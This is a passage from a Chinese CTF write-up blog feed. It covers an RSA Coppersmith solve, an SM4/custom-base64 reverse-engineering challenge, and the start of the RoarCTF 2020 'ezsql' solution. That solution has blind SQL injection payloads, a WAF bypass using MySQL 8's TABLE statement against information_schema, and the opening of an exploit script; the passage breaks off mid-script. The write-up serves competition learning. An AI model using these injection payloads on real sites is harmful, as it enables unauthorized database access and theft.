&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;99533148715508609137315732805340516238122605337971905073134049106535471150400953730776337851964290567462702510396193784084088446908685021259972049637120028927772077104891416698410847060838652281541457498771809838214954281245418160294140103403240809785976984535856950679868772244695570256951863999317571672437&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;34338582171207379862033525927782528983529583622746250191048534516512185865146804370249601090807953801674089517476781590729012862579342009960254301681032365519483896873518539964443668111491961935441741311240417442342928596805632431072554504001292544711291709844962036644053777982072444079745282278911191432141&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PolynomialRing&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Zmod&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mbar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;128&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;roots&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;small_roots&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;epsilon&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mbar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;128&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;roots&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;m_str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;m_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;flag{&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;flag{321e5195-1b1e-4c40-816b-1dab7e595f49}&lt;/p&gt;
&lt;h2 id=&#34;re&#34;&gt;Re&lt;/h2&gt;
&lt;h3 id=&#34;friednly-re&#34;&gt;friednly re&lt;/h3&gt;
&lt;p&gt;sub413590
sub4120c0
sub412040
sub411db0
sub41123f是关键函数
main函数中先nop掉几个指令，能够输入
然后手动hook messageboxw,因为main函数前尝试程序自己失败了，hook成函数sub411370,
然后注册了异常，异常有注册了异常，经过整理明白，按顺序整理
sub4120c0 sm4密钥初始化
然后sub412040 sm4对我们输入加密
sub411db0 对比的答案移位 对sm4加密后的结果进行改base64加密
sub_412450最后对比
但是最后的感叹号与@不对应，想了还久
后面百度到是安洵杯的题目魔改 ，看了一下，看好像是作者没写好了
应用安洵杯的脚本 改一下就行 
找到的安询杯的脚本来源
&lt;a href=&#34;https://blog.csdn.net/qq_39542714/article/details/106834822&#34;&gt;https://blog.csdn.net/qq_39542714/article/details/106834822&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;n&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pysm4&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encrypt&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;Str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Str_&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#34;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;Str1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nl&#34;&gt;Str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;Str1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Str1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;enc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;2NI5JKCBI5Hyva+8AZa3mq!!&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;dec1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;!&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;dec1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;dec1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Str_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Str1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dec1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;dec2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dec1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dec2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;codecs&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;encode_hex&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;codecs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getencoder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hex_codec&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;dec3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode_hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dec2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dec3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Thisisinsteresth&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode_hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;decode_hex&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;codecs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getdecoder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hex_codec&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;dec4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dec3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;dec4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dec4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode_hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dec4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>RoarCTF 2020</title>
        <link>https://anthem-whisper.github.io/p/roarctf-2020/</link>
        <pubDate>Mon, 07 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/roarctf-2020/</guid>
        <description>&lt;h3 id=&#34;ezsql&#34;&gt;ezsql&lt;/h3&gt;
&lt;p&gt;考点：布尔盲注，MySQL_8.0.19新特性&lt;code&gt;table&lt;/code&gt;语句，无列名盲注&lt;/p&gt;
&lt;p&gt;截图截没有了，忘了，简单说下思路：&lt;/p&gt;
&lt;p&gt;传统艺能sqli，本来是一个常规的布尔盲注，不过由于waf写的很黑，大小写ban掉了select，导致没有办法跨表查询，只能同表查询或者查库名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;admin&#39;/**/and/**/ascii(substr(database(),1,1))&amp;gt;32#
//库名ctf
admin&#39;/**/and/**/ascii(substr(password,1,1))&amp;gt;32#
//密码b4bc4c343ed120df3bff56d586e6d617
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;本来测出来有堆叠，但是由于waf写的很黑，堆叠也胎死腹中。&lt;/p&gt;
&lt;p&gt;注出来密码md5(gml666)==b4bc4c343ed120df3bff56d586e6d617之后，登陆，提示no flag；
由于waf写的很黑，这到题如果MySQL版本不是&amp;gt;=8.0.19的话就是没有方法做的；&lt;/p&gt;
&lt;p&gt;我们能够在&lt;a class=&#34;link&#34; href=&#34;https://dev.mysql.com/doc/refman/8.0/en/table.html&#34;  title=&#34;官方文档&#34;
     target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;官方文档&lt;/a&gt;找到以下资料&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The TABLE statement in some ways acts like SELECT. Given the existance of a table named t, the following two statements produce identical output:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;TABLE&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can order and limit the number of rows produced by TABLE using ORDER BY and LIMIT clauses, respectively. These function identically to the same clauses when used with SELECT (including an optional OFFSET clause with LIMIT)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本地Windows起一个MySQL_8.0.22的环境调试了一下，发现了之前&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/2020i%e6%98%a5%e7%a7%8b%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b_web_wp/&#34;  title=&#34;新春战疫&#34;
     target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;新春战疫&lt;/a&gt;的ezsql的姿势可以用，当时还抄了颖奇师傅的博客。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;核心payload：(select &amp;lsquo;admin&amp;rsquo;,&amp;lsquo;admin&amp;rsquo;)&amp;gt;(select * from users limit 1)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;假设flag为flag{bbbbb}，对于payload这个两个select查询的比较，是按位比较的，即先比第一位，如果相等则比第二位，以此类推；在某一位上，如果前者的ASCII大，不管总长度如何，ASCII大的则大，这个不难懂，和c语言的strcmp()函数原理一样，举几个例子：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;glag &amp;gt; flag{bbbbb}&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;alag{zzzzzzzzzzz} &amp;lt; flag{bbbbb}&lt;/li&gt;
&lt;li&gt;a &amp;lt; flag{bbbbb}&lt;/li&gt;
&lt;li&gt;z &amp;gt; flag{bbbbb}&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;库名已知，我们需要的就是表名，根据写的很黑的waf，我们其实只有一条路：&lt;code&gt;information_schema.tables&lt;/code&gt;，这张表结构大概是这样：
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210116013103.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;第一列&lt;code&gt;TABLE_CATALOG&lt;/code&gt;基本都是&lt;code&gt;def&lt;/code&gt;，少数是&lt;code&gt;NULL&lt;/code&gt;，第二列是库名，第三列是表名，我们就只需要知道这些，另外的太多了不方便贴。&lt;/p&gt;
&lt;p&gt;payload大概长这样：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;admin&#39;/**/and/**/ROW(&#39;ctf&#39;,&#39;aser&#39;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&amp;lt;(table/**/information_schema.tables/**/limit/**/0,1)#
//返回password error!
admin&#39;/**/and/**/ROW(&#39;ctf&#39;,&#39;aser&#39;,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&amp;gt;(table/**/information_schema.tables/**/limit/**/0,1)#
//返回,username error!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来是exp：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#python3&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://139.129.98.9:30003/login.php&amp;#39;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;trans&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;0x&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;

